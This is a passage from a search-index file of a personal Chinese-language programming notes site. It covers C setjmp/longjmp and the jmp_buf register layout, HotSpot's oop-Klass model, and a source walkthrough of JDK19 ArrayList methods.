<p>\u6709\u4eba\u60f3\u95ee\u4e86\uff0c<code>jmp_buf</code>\u662f\u4e2a\u5565\uff0c\u662f\u4fdd\u5b58\u7684\u73af\u5883\u5417\uff1f\u5bf9\u5185\u5b58\u8fdb\u884c\u4e86\u63a2\u6d4b\uff0c\u53d1\u73b0\u4ed6\u5176\u5b9e\u662f\u4e00\u4e2a\u6307\u9488\u6307\u5411\u5185\u5b58\u4e2d\u7684\u67d0\u5757\u5730\u5740\uff0c\u5728<code>setjmp</code>\u4e4b\u524d\uff0c\u90a3\u7247\u5730\u5740\u8fd8\u662f\u6ca1\u4eba\u7528\u7684\uff0c\u4f46\u662fset\u4e4b\u540e\u5c31\u6709\u4e86\uff0c\u6709\u5565\u4e86\u5462\uff1f\u4e00\u5806\u4e0d\u8ba4\u8bc6\u7684\u6570\u636e\u3002</p> <p>\u91cd\u65b0\u56de\u5230\u5934\u6587\u4ef6\uff0c\u6211\u4eec\u53c8\u53d1\u73b0\u4e86\u4e00\u4e2a\u53eb<code>__JUMP_BUFFER</code>\u7684\u7ed3\u6784\u4f53</p> <pre><code>  typedef struct __JUMP_BUFFER {\n    unsigned long Frame;\n    unsigned long R4;\n    unsigned long R5;\n    unsigned long R6;\n    unsigned long R7;\n    unsigned long R8;\n    unsigned long R9;\n    unsigned long R10;\n    unsigned long R11;\n    unsigned long Sp;\n    unsigned long Pc;\n    unsigned long Fpscr;\n    unsigned long long D[8];\n  } _JUMP_BUFFER;\n//\u5f53\u7136\uff0c\u4ed6\u5e76\u4e0d\u662f\u76f4\u63a5\u8fd9\u6837\u5199\u7684\uff0c\u800c\u662f\u5199\u4e86\u5f88\u591a\u6761\u4ef6\u7f16\u8bd1\u8bed\u53e5\uff0c\u4ee5\u6ee1\u8db3\u4e0d\u540c\u64cd\u4f5c\u7cfb\u7edf\u3002\n</code></pre> <p>\u8fd9\u4e9b\u662f\u5565\u5462\uff1f</p> <p>\u5982\u679c\u770b\u8fc7\u6c47\u7f16\u8bed\u8a00\u7684\u5bc4\u5b58\u5668\u67b6\u6784\u7684\u5e94\u8be5\u5bf9\u6709\u4e9b\u540d\u5b57\u5f88\u719f\u6089\u3002\u6bd4\u5982R4~R11\uff0cPC\uff0cSp\u7b49\u7b49\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u8fd9\u4e9b\u662f\u7528\u6765\u4fdd\u5b58\u5f53\u65f6\u7684\u5bc4\u5b58\u5668\u4fe1\u606f\u7684\u54af\uff01</p> <p>\u8fd9\u91cc\u7684\u7ed3\u679c\u4e22\u5931\u4e86</p> <p>\u56fe1\u30012\u5bf9\u5e94\u7684\u662f\u540c\u4e00\u4e2a\u53d8\u91cf\u7684\u503c\u4e0b\u7684\u5bc4\u5b58\u5668\u73af\u5883\u3002\u56fe3\u5bf9\u5e94\u7684\u662f\u6ce8\u91ca\u90e8\u5206\u7684\u5bc4\u5b58\u5668\u73af\u5883\u3002\u6211\u4eec\u53d1\u73b0\u53ca\u65f6\u4ee3\u7801\u76f8\u540c\uff0c\u8fd9\u91cc\u7684\u503c\u4e5f\u4e0d\u76f8\u540c\uff0cwhy\uff1f</p> <pre><code>#include&lt;stdio.h&gt;\n#include &lt;setjmp.h&gt;\nstatic jmp_buf jbf;\nvoid nu(){\n    longjmp(jbf,1);\n}\n\nint main()\n{\n    int a = 1,b=2,c= 3,d= 4;\n    b = setjmp(jbf);\n    //\u6b64\u65f6a\u7684\u503c\u4e3a1\n    if(b==0){\n        a = -111111;//a=111111;\n        nu();\n    }\n    printf(\"%d\\n\",a);\n    /*\n    \u8fd9\u91cc\u8f93\u51faa\u7684\u7ed3\u679c\uff0c\u9a8c\u8bc1setjmp\u4e2d\u4fdd\u5b58\u7684\u5230\u5e95\u662f\u5f53\u65f6\u7684\u53d8\u91cf\u503c\u8fd8\u662f\u53d8\u91cf\u5730\u5740\u3002\n    \u5982\u679c\u8f93\u51fa1\u5219\u4e3a\u53d8\u91cf\u503c\n    \u5982\u679c\u8f93\u51fa-111111\uff0c\u5219\u4e3a\u53d8\u91cf\u5730\u5740\n    \u7ed3\u679c\u662f-111111\n    */\n    return 0;\n}\n</code></pre> <p>\u6240\u4ee5\u4fdd\u5b58\u7684\u662f\u53d8\u91cf\u5730\u5740\u3002</p> <p>\u8fd9\u91cc\u7684\u7ed3\u679c\u4e22\u5931\u4e86</p> <p>\u770b\u5230\u4e86\u5417\uff0c\u8fd9\u4e24\u4e2a\u5730\u5740\u6328\u5f97\u5f88\u8fd1\uff0c\u76f8\u5dee32\u4e2abit\uff0c\u4e5f\u5c31\u662f\u521a\u597d\u4e00\u4e2aint\u7c7b\u578b\u3002\u90a3\u4e48\u4e5f\u5c31\u662f\u8bf4\uff0c\u8fd9\u91cc\u5b58\u653e\u7684\u5c31\u662f\u6211\u4eec\u4f7f\u7528\u7684a\u3002\u800c\u6211\u4eec\u90fd\u77e5\u9053\uff0ca\u653e\u5728\u6808\u91cc\u9762\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c<code>setjmp</code>\u5e76\u6ca1\u6709\u9000\u6808\u64cd\u4f5c\uff0c\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684\u53d8\u91cf\u4f9d\u7136\u5b58\u653e\u5728\u6808\u4e2d\u3002\u800cjmp\u79e9\u5e8f\u8bb0\u5f55\u5bc4\u5b58\u5668\u4e2d\u7684\u591a\u5bf9\u5e94\u7684\u53d8\u91cf\u7684\u5730\u5740\u5c31\u884c\u4e86\u3002\uff08PS\uff1a\u5f53\u7136\u5e94\u8be5\u8fd8\u5b58\u653e\u4e86\u51fd\u6570\u5e27\uff09\u3002</p> <p>\u603b\u800c\u8a00\u4e4b\uff0c\u6211\u4eec\u73b0\u5728\u77e5\u9053\u4e86\uff0c\u5728\u8fd9\u4e2a\u91cc\u9762\u4e0d\u662f\u7b80\u5355\u7684\u4e00\u4e2aint\u578b\uff0c\u800c\u662f\u4e00\u4e2a\u6307\u9488\uff0c\u6307\u5411\u4e00\u5757\u6570\u636e\uff0c\u8fd9\u5757\u6570\u636e\u4e2d\u7684\u4fe1\u606f\u7528\u4e8e\u56de\u590d\u4f46\u662f\u5f97\u73af\u5883\u3002</p>"},{"location":"Note/JVM%E5%AD%A6%E4%B9%A0/","title":"JVM\u5b66\u4e60","text":""},{"location":"Note/JVM%E5%AD%A6%E4%B9%A0/#java","title":"Java\u9762\u76f8\u5bf9\u8c61\u7684\u5e95\u5c42\u8868\u73b0\u5f62\u5f0f","text":"<p>HotSpot\u91c7\u7528oop-Klass\u6a21\u578b\u8868\u793aJava\u7684\u9762\u76f8\u5bf9\u8c61\u548c\u7c7b\u3002oop(ordinary object pointer)\u6307\u666e\u901a\u7684\u5bf9\u8c61\u6307\u9488\uff0cKlass\u8868\u793a\u5bf9\u8c61\u7684\u5177\u4f53\u7c7b\u578b\u3002</p>"},{"location":"Note/JVM%E5%AD%A6%E4%B9%A0/#klass","title":"Klass","text":"<p>Klass\u7c7b\u7ee7\u627fMetaDat12a\uff0cKlass\u7c7b\u7684\u7ed3\u6784\u5982\u4e0b</p> \u5b57\u6bb5\u540d \u7c7b\u578b \u8bf4\u660e _layout_helper jint(int) \u5bf9\u8c61\u5e03\u5c40\u7684\u603b\u548c\u63cf\u8ff0\u7b26\uff0c\u5982\u679c\u4e0d\u662f\u5bf9\u8c61\u6216\u8005\u6570\u7ec4\uff08\u6bd4\u5982\u5e38\u91cf\u6c60\uff09\uff0c\u8fd9\u4e2a\u503c\u4e3a0\uff0c\u5426\u5219\u8fd9\u4e2a\u503c\u5c06\u4ee3\u88684\u4e2a\u7ec4\u5408\u6570\uff0c\u7ec4\u5408\u6570\u5177\u4f53\u6709\u4ec0\u4e48\u542b\u4e49\u6709\u5b50\u7c7b\u5b9e\u73b0 _name Symbol (char) \u7c7b\u540d _primary_supers Klass*[]\uff08Klass\u6307\u9488\u6570\u7ec4\uff09 \u8868\u793a\u5f53\u524d\u7c7b\u7684\u7236\u7c7b\u7684\u7ee7\u627f\u94fe\uff0c\u9ed8\u8ba4\u957f\u5ea6\u4e3a8\uff0c\u53ef\u4ee5\u901a\u8fc7<code>-XX:FastSuperclassLimit=5</code>\u5c06\u9650\u5236\u6539\u4e3a5\u3002\u5f53\u8d85\u51fa\u9650\u5ea6\u65f6\uff0c\u8d85\u51fa\u7684\u90e8\u5206\u4f1a\u653e\u5165_secondary_supers\u4e2d\u3002\u4f8b\u5982\u5f53\u524d\u7c7bA\u7ee7\u627fB\uff0cB\u7ee7\u627fC\uff0c\u90a3\u4e48\u6570\u7ec4\u4e2d\u5b58\u653e\u7684\u5c31\u662f{A,B,C} _java_mirror oop\uff08oopDesc*\u7c7b\u578b\uff09 \u4fdd\u5b58\u5f53\u524dKlass\u5b9e\u4f8b\u5728Java\u7c7b\u6240\u5bf9\u5e94\u7684java.lang.Class\u7684\u5bf9\u8c61\uff0c\u53ef\u4ee5\u636e\u6b64\u8bbf\u95ee\u9759\u6001\u5c5e\u6027 _super_check_offset juint(unsigned int) \u6307\u5411\u7ee7\u627f\u94fe\u4e2d\u81ea\u5df1\u7684\u4f4d\u7f6e\u4e0e\u81ea\u5df1\u5b9e\u4f8b\u7684\u5176\u5b9e\u5730\u5740\u7684\u504f\u79fb\u91cf\u3002\u6bd4\u5982\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u8fd9\u4e2a\u503c\u5c31\u662f\uff082+primary_supers\u504f\u79fb\u91cf\uff09 \uff0c \u56e0\u4e3a primary_supers[2]\u4e2d\u7684\u6307\u6b63\u6307\u5411\u7684\u5c31\u662fA\u7684Klass\u3002\u5f53\u7ee7\u627f\u94fe\u5927\u4e8e8\u65f6\uff0c\u4ed6\u7684\u503c\u5c31\u548c_secondary_super_cache\u4e00\u6837 _secondary_supers Array  * (\u53ef\u52a8\u6001\u53d8\u5316\u7684\u6570\u7ec4\u6307\u9488) \u4e00\u822c\u5b58\u50a8Java\u7c7b\u5b9e\u73b0\u7684\u63a5\u53e3\uff0c\u5076\u5c14\u8fd8\u4f1a\u5b58\u50a8Java\u7c7b\u4ee5\u53ca\u5176\u7236\u7c7b _secondary_supers_cache Klass* \u4fdd\u5b58\u4e0a\u4e00\u6b21\u67e5\u8be2\u7236\u7c7b\u7684\u7ed3\u679c _super Klass* \u6307\u5411Java\u7c7b\u7684\u76f4\u63a5\u7236\u7c7b _subklass Klass* \u6307\u5411Java\u7c7b\u7684\u76f4\u63a5\u5b50\u7c7b\uff0c\u591a\u4e2a\u5b50\u7c7b\u4f1a\u901a\u8fc7_next_sibling\u8fde\u63a5\u8d77\u6765 _next_sibling Klass* \u83b7\u53d6\u5f53\u524d\u7c7b\u7684\u5144\u5f1f\u5b50\u7c7b\uff08\u4e8c\u8005\u76f4\u63a5\u7ee7\u627f\u540c\u4e00\u4e2a\u7236\u7c7b\uff09 _next_link Klass* \u6307\u5411ClassLoader\u52a0\u8f7d\u7684\u4e0b\u4e00\u4e2aKlass _class_loader_data ClassLoaderData* \u901a\u8fc7\u6b64\u5c5e\u6027\u627e\u5230\u52a0\u8f7d\u8be5Java\u7c7b\u7684ClassLoader _access_flags AccessFlags \u6743\u9650\u4fee\u9970\u7b26\uff0c\u6bd4\u5982private\u3001final\u3001static\u3001abstract\u3001native\u7b49 _prototype_header markOop \u548c\u9501\u7684\u5b9e\u73b0\u6709\u5173 _modified_oops jbyte(byte) \u548cGC\u5b9e\u73b0\u6709\u5173\uff0c\u53ef\u7528\u4e8eYC\u3001CMS _accumulated_modified_oops jbyte(byte) \u548cGC\u6709\u5173\uff0c\u4ec5\u7528\u4e8eCMS <p>MetadataMetadataKlassKlassInstanceKlassInstanceKlassArrayKlassArrayKlassInstanceMirrorKlassInstanceMirrorKlassInstanceClassLoadKlassInstanceClassLoadKlassInstanceRefKlassInstanceRefKlassTypeArrayKlassTypeArrayKlassObjArrayKlassObjArrayKlassConstantPoolConstantPoolText is not SVG - cannot display</p>"},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","title":"JAVA\u6e90\u7801\u5206\u6790(JDK19)","text":"<p>\u5206\u6790\u6e90\u7801,\u4e86\u89e3\u539f\u7406,\u540c\u65f6\u8ba9\u81ea\u5df1\u7684\u4ee3\u7801\u66f4\u52a0\u4f18\u96c5</p>"},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#maplistset","title":"\u6570\u636e\u96c6\u7bc7(Map,List,Set)","text":""},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#1-arraylistvector","title":"1. ArrayList(\u540c\u65f6\u548cVector\u6700\u5bf9\u6bd4\u5206\u6790)","text":""},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_1","title":"\u539f\u7406\u5206\u6790","text":"<ul> <li> <p>ArrayList\u662f\u7ebf\u7a0b\u4e0d\u5b89\u5168\u7684,\u4f46\u662f\u5728\u5355\u7ebf\u7a0b\u73af\u5883\u4e0b\u6548\u7387\u6bd4Vector\u9ad8,\u800cVector\u7684\u64cd\u4f5c\u90fd\u6709<code>synchronized</code>,\u5728\u591a\u7ebf\u7a0b\u4e0b\u66f4\u52a0\u5b89\u5168.</p> </li> <li> <p>ArrayList\u7684\u5e95\u5c42\u4f7f\u7528\u7684\u662f\u6570\u7ec4\u5b58\u50a8,\u4ed6\u76f8\u5f53\u4e8e\u662f\u4e00\u4e2a\u52a8\u6001\u53ef\u53d8\u6570\u7ec4,\u4e5f\u5c31\u662f\u5927\u5c0f\u53ef\u53d8.</p> </li> <li> <p>\u521d\u59cb\u751f\u6210\u7684ArrayList\u5bf9\u8c61\u662f\u4e00\u4e2a\u7a7a\u7684\u6570\u7ec4,\u4ed6\u6307\u5411\u7c7b\u4e2d\u7684\u9759\u6001\u4e0d\u53ef\u53d8 \u7a7a\u6570\u7ec4,\u6bcf\u4e00\u6b21\u8fdb\u884cadd\u64cd\u4f5c\u65f6\u90fd\u4f1a\u68c0\u67e5\u5e95\u5c42\u6570\u7ec4\u5927\u5c0f,\u6839\u636e\u9700\u6c42\u5bf9\u5e95\u5c42\u6269\u5bb9.</p> </li> <li> <p>ArrayList\u5bf9\u8c61\u5728\u7b2c\u4e00\u6b21\u4f7f\u7528(add\u64cd\u4f5c),\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u521d\u59cb\u5927\u5c0f,\u9ed8\u8ba4\u4e3a10;</p> </li> <li> <p>\u5bf9\u8c61\u4e2d\u6709\u4e2a\u6210\u5458\u53d8\u91cf<code>size</code>,\u8fd9\u4e2a\u662f\u6307\u5f53\u524d\u6570\u7ec4\u4e2d\u542b\u6709\u7684\u5143\u7d20\u4e2a\u6570,\u5e38\u7528\u6765\u904d\u5386\u6570\u7ec4\u4e2d\u7684\u6570\u636e,\u4f46\u662f\u8981\u6ce8\u610f,\u8fd9\u4e2a\u6210\u5458\u53d8\u91cf\u5e76\u4e0d\u662f\u503c\u5e95\u5c42\u6570\u7ec4\u7684\u957f\u5ea6,\u5e95\u5c42\u6570\u7ec4\u7684\u957f\u5ea6\u4e00\u5b9a\u5927\u4e8e\u7b49\u4e8e\u8fd9\u4e2a<code>size</code>.</p> </li> <li> <p>\u6bcf\u4e00\u6b21<code>add()</code>\u64cd\u4f5c\u90fd\u4f1a\u68c0\u67e5\u5bf9\u8c61\u7684<code>size</code>\u548c\u5e95\u5c42\u6570\u7ec4\u7684<code>length</code>\u7684\u5927\u5c0f\u5173\u7cfb:\u5982\u679c\u5e95\u5c42\u6570\u7ec4\u957f\u5ea6\u4e0d\u8fc7,\u5c31\u4f1a\u8c03\u7528<code>grow()</code>,\u5728<code>grow()</code>\u91cc\u9762\u4f1a\u6bd4\u8f83\u4f20\u5165\u7684\u589e\u91cf\u548c\u9ed8\u8ba4\u589e\u91cf(\u539f\u957f\u5ea6\u7684\u4e00\u534a)\u7684\u5927\u5c0f,\u53d6\u6700\u5927\u7684\u4e00\u4e2a\u4f5c\u4e3a\u5b9e\u9645\u589e\u91cf,\u907f\u514d\u4e86\u9891\u7e41\u7684\u589e\u52a0.\u786e\u5b9a\u597d\u589e\u91cf\u4e4b\u540e\u4f1a\u8c03\u7528\u5e95\u5c42\u7684\u65b9\u6cd5,\u5e76\u4e14\u5c06\u4e4b\u524d\u7684\u6570\u636ecopy\u5230\u65b0\u7684\u6570\u7ec4\u4e2d,\u53ef\u89c1ArrayList\u7684\u6269\u5bb9\u64cd\u4f5c\u662f\u591a\u4e48\u7684\u8d39\u52b2.</p> </li> </ul> <pre><code>private Object[] grow(int minCapacity) {\n    int oldCapacity = elementData.length;\n    if (oldCapacity &gt; 0 || elementData != DEFAULTCAPACITY_EMPTY_ELEMENTDATA) {\n        int newCapacity = ArraysSupport.newLength(oldCapacity,//\u539f\u6765\u7684\u5927\u5c0f(\u6307\u7684\u662f\u5e95\u5c42\u6570\u7ec4\u7684\u5927\u5c0f)\n                                                  minCapacity - oldCapacity,//\u6700\u5c0f\u589e\u91cf\u7684\u5927\u5c0f\n                                                  oldCapacity &gt;&gt; 1);//\u53ef\u4f9b\u53c2\u8003\u7684\u589e\u91cf\u5927\u5c0f,\u8fd9\u91cc\u662f\u539f\u5927\u5c0f\u7684\u4e00\u534a\n        //\u5e95\u5c42\u4f1a\u53d6\u540e\u4e24\u4e2a\u503c\u5f97\u6700\u5927\u503c,\u4e0e\u539f\u6765\u7684\u5927\u5c0f\u76f8\u52a0(oldCapacity),\u5f97\u5230\u65b0\u7684\u5927\u5c0f,\u5927\u591a\u60c5\u51b5\u4e0b\u662f\u6269\u5bb9\u4e3a\u4e4b\u524d\u76841.5\u500d\n        return elementData = Arrays.copyOf(elementData, newCapacity);//\u5e95\u5c42\u91cd\u5efa,\u5e76\u4e14\u5c06\u4e4b\u524d\u7684\u6570\u7ec4\u8d4b\u503c\u8fc7\u6765\n    } else {\n        return elementData = new Object[Math.max(DEFAULT_CAPACITY, minCapacity)];\n    }\n}\n</code></pre> <ul> <li>\u65e0\u8bba\u662f\u901a\u8fc7\u4e0b\u6807<code>remove()</code>,\u8fd8\u662f\u901a\u8fc7\u5bf9\u8c61\u6765<code>remove()</code>,\u672c\u8d28\u4e0a\u90fd\u662f\u901a\u8fc7\u4e0b\u6807\u5220\u9664,\u53ea\u4e0d\u8fc7\u540e\u8005\u901a\u8fc7\u5bf9\u8c61\u627e\u5230\u4e86\u4e0b\u6807.</li> </ul> <pre><code>public boolean remove(Object o) {\n    final Object[] es = elementData;\n    final int size = this.size;\n    int i = 0;\n    found: {\n        if (o == null) {\n            for (; i &lt; size; i++)\n                if (es[i] == null)\n                    break found;\n        } else {\n            for (; i &lt; size; i++)\n                if (o.equals(es[i]))\n                    break found;\n        }\n        return false;\n    }\n    fastRemove(es, i);\n    return true;\n}\n</code></pre> <ul> <li><code>remove()</code>\u65b9\u6cd5\u8c03\u7528\u7684\u6210\u672c\u6821\u5bf9\u8f83\u9ad8,\u4ed6\u4f1a\u8c03\u7528<code>System</code>\u5e95\u5c42\u5355\u51fd\u6570,\u5c06\u6570\u7ec4\u6574\u4f53\u5411\u524d\u79fb\u52a8,\u4f46\u662f\u6570\u7ec4\u7684\u5927\u5c0f\u4e0d\u4f1a\u53d8.(\u4e4b\u6240\u4ee5\u8bf4\u6210\u672c\u9ad8,\u662f\u56e0\u4e3a\u6211\u4eec\u90fd\u77e5\u9053\u5bf9\u4e8e\u6570\u7ec4\u7684\u6539\u52a8\u64cd\u4f5c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aO(n)),\u4e0d\u8fc7\u5bf9\u4e8eArrayList\u5bf9\u8c61\u4e2d\u7684<code>size</code>\u662f\u80af\u5b9a\u51cf\u5c11\u4e86,\u5c31\u7b97\u5c06ArrayList\u4e2d\u7684\u6240\u6709\u6240\u6709\u5143\u7d20\u5168\u90e8\u79fb\u9664\u4e86,\u5e95\u5c42\u7684\u6570\u7ec4\u4e5f\u56de\u4e0d\u5230\u6700\u521d\u7684\u72b6\u6001(\u6307\u5411\u7c7b\u4e2d\u7684\u4e00\u4e2a\u9759\u6001\u4e0d\u53ef\u53d8\u7a7a\u6570\u7ec4),\u800c\u662f\u4f1a\u4fdd\u7559\u4e00\u4e2a\u4f4d\u7f6e,\u5176\u503c\u4e3a<code>null</code></li> </ul> <pre><code>private void fastRemove(Object[] es, int i) {\n    modCount++;//\u4fee\u6539\u8ba1\u6570\u5668\n    final int newSize;//final\u4fee\u9970\u53d8\u91cf,\u53d8\u91cf\u53ea\u80fd\u88ab\u8d4b\u503c\u4e00\u6b21,\u4f46\u5e76\u4e0d\u4e00\u5b9a\u5728\u58f0\u660e\u7684\u65f6\u5019\u8d4b\u503c\n    if ((newSize = size - 1) &gt; i)//\u5982\u679c\u5220\u9664\u540e\u8fd8\u6709\u5143\u7d20\n        System.arraycopy(es, i + 1, es, i, newSize - i);\n    es[size = newSize] = null;\n}\n</code></pre> <ul> <li><code>clear()</code>\u51fd\u6570\u662f\u7528\u6765\u6e05\u7a7a\u5e95\u5c42\u6570\u7ec4\u5185\u5bb9\u7684,\u4f46\u662f\u4ed6\u4e0d\u4f1a\u4fee\u6539\u5e95\u5c42\u6570\u7ec4\u7684\u5927\u5c0f,\u56e0\u6b64\u4ed6\u4e0d\u80fd\u7b49\u540c\u4e8e<code>remove()</code>\u7684\u5c01\u88c5</li> </ul> <pre><code>public void clear() {\n    modCount++;\n    final Object[] es = elementData;\n    for (int to = size, i = size = 0; i &lt; to; i++)\n        es[i] = null;\n}\n</code></pre> <ul> <li><code>trimToSize()</code>\u53ef\u4ee5\u5220\u9664\u7a7a\u767d\u7684\u7a7a\u95f4\uff0c\u4ed6\u4f1a\u6839\u636esize\u7684\u5927\u5c0f\u91cd\u65b0\u5c06\u751f\u6210\u4e00\u4e2a\u6570\u7ec4\uff0c\u4f46\u662f\u4fdd\u8bc1\u6570\u636e\u5185\u5bb9\u4e0d\u53d8\u3002\u5f53\u4f30\u8ba1\u5f88\u5c11\u4f1a\u6709\u589e\u7684\u64cd\u4f5c\u540e\u4f7f\u7528\uff0c\u53ef\u8282\u7701\u7a7a\u95f4\uff0c\u4f46\u662f\u4e0d\u5efa\u8bae\u9891\u7e41\u4f7f\u7528\uff0c\u8fd9\u662f\u5e95\u5c42\u7684\u64cd\u4f5c\uff0c\u5bf9\u6027\u80fd\u6709\u635f\u8017\uff0c\u5e76\u4e14\u5982\u679c\u4e4b\u540e\u8981\u65b0\u589e\u6570\u636e\u65f6\uff0c\u53c8\u91cd\u65b0\u6269\u5bb9\uff0c\u5e26\u6765\u7684\u6027\u80fd\u5f00\u9500\u5f88\u5927\u3002</li> </ul> <pre><code>public void trimToSize() {\n    modCount++;\n    if (size &lt; elementData.length) {\n        elementData = (size == 0)\n          ? EMPTY_ELEMENTDATA\n          : Arrays.copyOf(elementData, size);\n    }\n}\n</code></pre> <ul> <li>\u5e73\u5e38\u5bf9\u4e8e\u96c6\u5408\u7684\u904d\u5386,\u6211\u4eec\u662f\u624b\u5199\u4e00\u4e2afor\u5faa\u73af,\u5bf9\u4e8e\u4e00\u4e9b\u590d\u6742\u7684\u64cd\u4f5c,\u53ef\u80fd\u53ea\u80fd\u5199for\u5faa\u73af\u6765\u5b8c\u6210,\u5c24\u5176\u662f\u90a3\u4e9b\u548c\u4e0b\u8868\u6709\u5173\u7684\u64cd\u4f5c,\u4f46\u662f\u5bf9\u4e8e\u4e00\u4e9b\u7b80\u5355\u7684,\u65e0\u5173\u8054\u7684\u64cd\u4f5c,jdk\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u79cd\u66f4\u52a0\u4f18\u96c5\u7684\u65b9\u5f0f.\u4f7f\u7528<code>foreach()</code>\u5bf9\u96c6\u5408\u51fd\u6570\u64cd\u4f5c.</li> </ul> <pre><code>//foreach\u662fIterable\u63a5\u53e3\u4e2d\u7684\u4e00\u4e2a\u65b9\u6cd5\ndefault void forEach(Consumer&lt;? super T&gt; action) {\n    Objects.requireNonNull(action);\n    for (T t : this) {\n        action.accept(t);\n    }\n}\n//\u8fd9\u4e2a\u662f\u63a5\u53e3Iterable\u7684\u9ed8\u8ba4\u5b9e\u73b0\n@Override\npublic void forEach(Consumer&lt;? super E&gt; action) {\n    Objects.requireNonNull(action);\n    final int expectedModCount = modCount;\n    final Object[] es = elementData;\n    final int size = this.size;\n    for (int i = 0; modCount == expectedModCount &amp;&amp; i &lt; size; i++)\n        action.accept(elementAt(es, i));\n    if (modCount != expectedModCount)//\u8bf4\u660e\u904d\u5386\u671f\u95f4\u53d1\u751f\u4e86\u6570\u636e\u4fee\u6539,\u591a\u7ebf\u7a0b\u73af\u5883\u4e0b\u9700\u8981\u6ce8\u610f\n        throw new ConcurrentModificationException();\n}\n//\u8fd9\u4e2a\u662fArrayList\u4e2d\u7684\u5b9e\u73b0.\n</code></pre> <p><code>forEach</code>\u7684\u5e95\u5c42\u5176\u5b9e\u662f\u901a\u8fc7Iterator\u5b9e\u73b0\u7684\uff0c\u800cIterator\u4e0e<code>fori</code>\u6027\u80fd\u4e8e\u5176\u6570\u636e\u63a5\u53e3\u6709\u5173\uff0c\u5982\u679c\u5e95\u5c42\u662f\u901a\u8fc7\u6570\u7ec4\u7b49\u8fde\u7eed\u5730\u5740\u7a7a\u95f4\u8bbf\u95ee\uff0c\u901a\u5e38<code>fori</code>\u7684\u6027\u80fd\u9ad8\u4e8eIterator\uff08\u4f46\u662f\u6548\u679c\u4e0d\u660e\u663e\uff09\uff0c\u4f46\u662f\u5982\u679c\u5e95\u5c42\u901a\u8fc7\u94fe\u8868\u7b49\u65b9\u5f0f\u8bbf\u95ee\u7684\u8bdd\uff0cIterator\u6027\u80fd\u8fdc\u9ad8\u4e8e<code>fori</code>\uff0c\u539f\u7406\u5f88\u7b80\u5355\uff1a\u8c01\u7684\u5bfb\u5740\u8ddf\u5feb\uff0c\u8c01\u7684\u6027\u80fd\u66f4\u9ad8\u3002</p> <p>\u4f46\u662f\u7f51\u4e0a\u6709\u4e00\u79cd\u8bf4\u6cd5\uff0cJVM\u5bf9Iterator\u8fdb\u884c\u4e86\u6027\u80fd\u4f18\u5316\uff0c\u8fd9\u6837\u7684\u8bddIterator\u7684\u5404\u65b9\u9762\u6027\u80fd\u6bd4fori\u5f3a</p>"},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_2","title":"\u603b\u7ed3","text":"<ul> <li>ArrayList\u7684\u5e95\u5c42\u662f\u5bf9\u8c61\u6570\u7ec4,\u57fa\u7840\u7c7b\u578b\u6570\u636e\u4f7f\u7528\u4f1a\u81ea\u52a8\u62c6\u88c5\u7bb1,\u4e5f\u53ef\u4ee5\u5b58\u50a8null</li> <li>ArrayList\u5728\u591a\u7ebf\u7a0b\u73af\u5883\u4e0b\u662f\u4e0d\u5b89\u5168\u7684,\u8c28\u614e\u4f7f\u7528.\u4f46\u662f\u5728\u5355\u7ebf\u7a0b\u73af\u5883\u4e0b\u6548\u7387\u76f8\u5bf9\u8f83\u9ad8.\u591a\u7ebf\u7a0b\u73af\u5883\u4e0b\u53ef\u4ee5\u8003\u8651\u4f7f\u7528Vector\u6216\u8005\u5176\u4ed6\u96c6\u5408\u7c7b\u578b</li> <li>ArrayList\u6bcf\u6b21\u6dfb\u52a0\u7684\u65f6\u5019\u5e95\u5c42\u7684\u6570\u636e\u4e0d\u4e00\u5b9a\u4f1a\u53d1\u751f\u6539\u53d8,\u4f46\u662f\u5982\u679c\u53d1\u751f\u4e86\u6539\u53d8,\u90a3\u4e48\u65f6\u95f4\u590d\u6742\u5ea6\u662fO(n),\u56e0\u6b64\u5728\u505a\u4f18\u5316\u7684\u65f6\u5019,\u53ef\u4ee5\u4e8b\u5148\u5c06ArrayList\u7684\u5927\u5c0f\u6839\u636e\u4e1a\u52a1\u63d0\u524d\u521d\u59cb\u5316,\u907f\u514d\u5230\u540e\u671f\u7684\u52a8\u6001\u6269\u5bb9\u6240\u5e26\u4e86\u7684\u6027\u80fd\u4e8f\u635f.</li> <li>Vector\u9664\u4e86\u5728\u591a\u7ebf\u7a0b\u5b89\u5168\u6027\u65b9\u9762\u8868\u73b0\u7684\u6bd4ArrayList\u597d\u4ee5\u5916,\u5176\u4f59\u90fd\u548cArrayList\u5dee\u4e0d\u591a,\u4f46\u662f\u5355\u7ebf\u7a0b\u4e0b\u8fd8\u662f\u63a8\u8350\u4f7f\u7528ArrayList.</li> <li>\u5728\u4e00\u4e9b\u6267\u884c\u5468\u671f\u6bd4\u8f83\u957f\u6216\u8005\u4e0d\u786e\u5b9a\u7684\u64cd\u4f5c\u4e2d,\u5c3d\u91cf\u4fdd\u8bc1\u5bf9\u5916\u539f\u5b50\u5316.\u4e5f\u5c31\u662f\u53ea\u5728\u51fd\u6570\u5f00\u59cb\u548c\u7ed3\u675f\u7684\u65f6\u5019\u4e0e\u5916\u754c\u8fdb\u884c\u6570\u636e\u4ea4\u4e92,\u4e2d\u95f4\u7684\u6267\u884c\u8fc7\u7a0b\u5f62\u6210\u4e00\u4e2a\u5185\u5c01\u95ed.</li> 